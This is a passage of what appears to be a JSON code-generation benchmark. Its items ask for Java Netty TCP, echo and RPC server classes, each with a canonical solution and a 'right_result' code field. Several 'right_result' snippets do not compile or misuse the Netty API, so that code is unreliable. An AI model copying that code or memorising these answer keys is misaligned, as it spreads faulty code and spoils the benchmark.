.addLast(\"mysqlHandler\", new MysqlHandler(mysqlConnection));\n                ch.pipeline().addLast(\"exception\", new NettyHandlers.ExceptionHandler());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.Map;\n\npublic class MysqlNettyServer {\n    private String host;\n    private int port;\n    private static final Map<String, MysqlConnection> connections = new ConcurrentHashMap<>();\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        eventLoopGroup = new NioEventLoopGroup();\n        server = new ServerBootstrap();\n        server.group(eventLoopGroup)\n              .channel(NioServerSocketChannel.class)\n              .childHandler(channelInitializer())\n              .localAddress(getSocketAddress());\n        ChannelFuture future = server.bind(port).sync();\n        future.channel().closeFuture().await();\n    }\n\n    private InetSocketAddress getSocketAddress() {\n        return host == null ? new InetSocketAddress(0) : new InetSocketAddress(host, port);\n    }\n\n    public ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(new MySQLHandshakeHandler());\n                pipeline.addLast(new MySQLMessageDecoder());\n                pipeline.addLast(new MySQLCommandHandler());\n                pipeline.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                pipeline.addLast(new ExceptionHandler());\n            }\n        };\n    }\n\n    public void close() {\n        if (server != null) {\n            server.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully();\n        }\n        connections.clear();\n    }\n\n    public static class MysqlConnection {\n        private final String id;\n        private final Channel channel;\n\n        public MysqlConnection(String id, Channel channel) {\n            this.id = id;\n            this.channel = channel;\n        }\n\n        public String getId() {\n            return id;\n        }\n\n        public Channel getChannel() {\n            return channel;\n        }\n    }\n\n    public static class MySQLHandshakeHandler extends ChannelHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            // Handle MySQL handshake\n            super.channelActive(ctx);\n        }\n    }\n\n    public static class MySQLMessageDecoder extends MessageToByteEncoder<MySQLMessage> {\n        @Override\n        protected void encode(ChannelHandlerContext ctx, MySQLMessage msg, ByteBuf out) throws Exception {\n            // Decode MySQL message\n            super.encode(ctx, msg, out);\n        }\n    }\n\n    public static class MySQLCommandHandler extends ChannelHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            // Process MySQL command\n            super.channelRead(ctx, msg);\n        }\n    }\n\n    public static class IdleStateHandler extends ChannelHandlerAdapter {\n        private final int readerIdleTime;\n        private final int writerIdleTime;\n        private final int allIdleTime;\n\n        public IdleStateHandler(int readerIdleTime, int writerIdleTime, int allIdleTime) {\n            this.readerIdleTime = readerIdleTime;\n            this.writerIdleTime = writerIdleTime;\n            this.allIdleTime = allIdleTime;\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent e = (IdleStateEvent) evt;\n                if (e.state() == IdleState.READerIdle) {\n                    // Handle reader idle\n                } else if (e.state() == IdleState.WRITER_IDLE) {\n                    // Handle writer idle\n                } else if (e.state() == IdleState.ALL_IDLE) {\n                    // Handle all idle\n                }\n            }\n            super.userEventTriggered(ctx, evt);\n        }\n    }\n\n    public static class ExceptionHandler extends ChannelHandlerAdapter {\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n            super.exceptionCaught(ctx, cause);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 171,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework to handle incoming client connections and process requests.\n\nClass Description: The `JacksonServer` class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and includes logging for monitoring server activity. The server is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\n- PORT: [int] - The port number on which the server will listen for incoming connections (default: 8082).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. It sets up the server configuration, binds to the specified port, and keeps the server running until it is shutdown. This method throws Exception if any error occurs during server startup or operation.\n  - Input: None\n  - Output: None (but may throw Exception)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class JacksonServer {\n\n    static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new JacksonServerInitializer());\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.NioServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.bytes.ByteArrayDecoder;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class JacksonServer {\n    private static final Logger logger = LoggerFactory.getLogger(JacksonServer.class);\n    private static final int PORT = 8082;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public void start() throws Exception {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .handler(new LoggingHandler(LogLevel.INFO))\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                             ch.pipeline().addLast(new SimpleChannelInboundHandler<byte[]>() {\n                                 @Override\n                                 protected void channelRead0(ChannelHandlerContext ctx, byte[] msg) {\n                                     ctx.writeAndFlush(msg);\n                                 }\n                             });\n                         }\n                     })\n                     .childOption(ChannelOption.AUTO_READ, true);\n\n            ChannelFuture future = bootstrap.bind(PORT).sync();\n\n            logger.info(\"Server started on port {}\", PORT);\n\n            future.channel().closeFuture().sync();\n            logger.info(\"Server shut down\");\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles RPC (Remote Procedure Call) requests and responses, including server startup, shutdown, and connection management.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that provides RPC functionality. It manages server lifecycle, connection handling, and request processing through a thread pool.\n\nAttributes:\n- thread: Thread - The thread running the Netty server instance\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty server with the specified RPC provider configuration. Initializes thread pools, event loops, and server bootstrap.\n  Input: \n    - xxlRpcProviderFactory: XxlRpcProviderFactory - Configuration factory providing server parameters and serializer\n  Output: None (server runs asynchronously in background thread)\n\n- stop() -> void - Stops the Netty server gracefully by interrupting the server thread and shutting down resources.\n  Input: None\n  Output: None (performs cleanup operations)\n\nThe class should handle:\n1. Server bootstrap configuration with NIO transport\n2. Connection pipeline setup with idle state detection\n3. Request/response serialization\n4. Thread pool management for request processing\n5. Graceful shutdown procedures",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport com.wugui.datax.rpc.remoting.net.Server;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) throws Exception {\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                        NettyServer.class.getSimpleName(),\n                        xxlRpcProviderFactory.getCorePoolSize(),\n                        xxlRpcProviderFactory.getMaxPoolSize());\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL*3, TimeUnit.SECONDS))\n                                            .addLast(new NettyDecoder(XxlRpcRequest.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyEncoder(XxlRpcResponse.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                                }\n                            })\n                            .childOption(ChannelOption.TCP_NODELAY, true)\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                    onStarted();\n                    future.channel().closeFuture().sync();\n                } catch (Exception e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        serverHandlerPool.shutdown();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() throws Exception {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyServer {\n    private final Thread thread;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ChannelFuture future;\n    private final ThreadPoolExecutor requestThreadPool;\n    private final ChannelGroup channelGroup = new DefaultChannelGroup();\n\n    public NettyServer(XxlRpcProviderFactory providerFactory) {\n        int corePoolSize = Math.min(Runtime.getRuntime().availableProcessors() * 2, 16);\n        requestThreadPool = new ThreadPoolExecutor(corePoolSize, corePoolSize, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());\n        thread = new Thread(() -> start(providerFactory));\n    }\n\n    public void start(XxlRpcProviderFactory providerFactory) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                        ch.pipeline().addLast(new IdleStateHandler.Handler() {\n                            @Override\n                            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                                if (evt instanceof IdleStateEvent && ((IdleStateEvent) evt).getIdleState() == IdleStateHandler.WRITER_IDLE) {\n                                    ctx.close();\n                                }\n                            }\n                        });\n                        ch.pipeline().addLast(new RpcRequestHandler(providerFactory.getSerializer()));\n                    }\n                });\n\n        future = bootstrap.bind(providerFactory.getPort()).syncUninterruptibly();\n        thread.start();\n    }\n\n    public void stop() {\n        if (future != null) {\n            future.channel().close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        channelGroup.close();\n        requestThreadPool.shutdownNow();\n        thread.interrupt();\n    }\n\n    private static class RpcRequestHandler extends SimpleChannelInboundHandler<Object> {\n        private final ObjectSerializer serializer;\n\n        public RpcRequestHandler(ObjectSerializer serializer) {\n            this.serializer = serializer;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            byte[] data = (byte[]) msg;\n            Object request = serializer.deserialize(data);\n            // Process request and generate response\n            Object response = processRequest(request);\n            byte[] responseData = serializer.serialize(response);\n            ctx.writeAndFlush(responseData);\n        }\n\n        private Object processRequest(Object request) {\n            // Simulated method invocation\n            return \"RPC Response\";\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that echoes back any received messages to the client. The server should be configurable to run on any specified port and should properly handle resource cleanup during shutdown.\n\nClass Description: EchoServer is a Netty-based TCP server implementation that listens for incoming connections, processes received messages by echoing them back, and manages server lifecycle including startup and graceful shutdown.\n\nAttributes:\n- DEFAULT_PORT: int - The default port number (7) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server bootstrap instance used to configure and start the server\n\nMethods:\n- EchoServer() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n  Input: port (int) - The port number to bind the server to\n- stop() -> void - Shuts down the event loop groups gracefully to release all resources\n- main(String[] args) -> void - Entry point that creates and starts the server instance\n  Input: args (String[]) - Command line arguments (optional port number)\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpContentDecoders;\nimport io.netty.handler.codec.http.HttpContentEncoders;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.channel.SimpleChannelInboundHandler;\n\npublic class EchoServer {\n    private static final int DEFAULT_PORT = 7;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new EchoServerHandler());\n                    }\n                })\n                .bind(port);\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Usage: java EchoServer [port]\");\n                return;\n            }\n        }\n        EchoServer server = new EchoServer();\n        server.start(port);\n        while (true) {\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class EchoServerHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            ctx.writeAndFlush(msg + \"\\r\\n\");\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage communication protocols.\n\nClass Description: RemoteServer is a TCP server implementation using Netty framework that listens on a specified port, manages client connections, and maintains a list of communication protocols. It extends BaseServer for basic server functionality.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - A list to maintain active communication protocols between clients and browsers\n\nMethods:\n- RemoteServer(int port) -> [Constructor] - Initializes the server with the specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server, configures the server bootstrap with worker groups, channel type, and handlers, then binds to the specified port\n- findProtocolByBrowser(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a browser's channel context\n- findProtocolByKey(String key) -> Protocol - Finds and returns a protocol associated with a specific key\n- findProtocolByClient(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a client's channel context",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChildChannel(new RemoteServerWebsocketEventImp()));\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && StringUtils.equals(key, protocol.getKey())) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port;\n    private List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        this.port = port;\n        this.protocolList = new ArrayList<>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new IdleStateHandler(0, 0, 10, TimeUnit.SECONDS));\n                            ch.pipeline().addLast(new MyHandler());\n                        }\n                    })\n                    .childOption(ChannelOption.SO_REUSEADDR, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getHandlerContext() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getKey().equals(key)) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    public Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientContext() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private static class MyHandler implements ChannelHandler {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            Protocol protocol = new Protocol();\n            protocolList.add(protocol);\n            ctx.attr(AttributeKey.valueOf(\"protocol\")).set(protocol);\n            super.channelActive(ctx);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            Protocol protocol = ctx.attr(AttributeKey.valueOf(\"protocol\")).get();\n            // Process the message\n            super.channelRead(ctx, msg);\n        }\n    }\n}"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Implement a Netty-based JAX-RS server class that handles HTTP requests and integrates with RESTEasy framework for RESTful service deployment.\n\nClass Description: SofaNettyJaxrsServer is a Netty-based embedded JAX-RS server implementation that provides HTTP communication capabilities and integrates with RESTEasy framework for RESTful service deployment. It supports both standard NIO and Epoll transport, SSL/TLS encryption, and customizable channel options.\n\nAttributes:\n- serverConfig: [ServerConfig] - Configuration object containing server settings\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- hostname: [String] - Hostname to bind the server to\n- port: [int] - Port number to listen on\n- deployment: [ResteasyDeployment] - RESTEasy deployment configuration\n- root: [String] - Root resource path\n- domain: [SecurityDomain] - Security domain for authentication\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- eventExecutor: [EventLoopGroup] - Netty event executor for business logic\n- ioWorkerCount: [int] - Number of I/O worker threads\n- executorThreadCount: [int] - Number of executor threads\n- sslContext: [SSLContext] - SSL context for secure connections\n- maxRequestSize: [int] - Maximum allowed HTTP request size\n- backlog: [int] - Connection backlog size\n- channelHandlers: [List<ChannelHandler>] - Additional channel handlers\n- channelOptions: [Map<ChannelOption, Object>] - Channel options\n- childChannelOptions: [Map<ChannelOption, Object>] - Child channel options\n- httpChannelHandlers: [List<ChannelHandler>] - Additional HTTP channel handlers\n\nMethods:\n- start(): [void] - Starts the Netty server and binds it to the configured host and port\n- stop(): [void] - Stops the server and releases all resources\n- createChannelInitializer(): [ChannelInitializer<SocketChannel>] - Creates a channel initializer for new connections\n- setupHandlers(SocketChannel ch, RequestDispatcher dispatcher): [void] - Sets up the channel pipeline with required handlers\n- createRequestDispatcher(): [RequestDispatcher] - Creates a RESTEasy request dispatcher",
    "Canonical_solution": "import com.alipay.sofa.rpc.common.SystemInfo;\nimport com.alipay.sofa.rpc.common.struct.NamedThreadFactory;\nimport com.alipay.sofa.rpc.common.utils.StringUtils;\nimport com.alipay.sofa.rpc.config.ServerConfig;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.EventExecutor;\nimport org.jboss.resteasy.core.SynchronousDispatcher;\nimport org.jboss.resteasy.plugins.server.embedded.EmbeddedJaxrsServer;\nimport org.jboss.resteasy.plugins.server.embedded.SecurityDomain;\nimport org.jboss.resteasy.plugins.server.netty.RequestDispatcher;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpRequestDecoder;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpResponseEncoder;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.net.InetSocketAddress;\nimport java.util.Collections;\nimport java.util.List;\nimport 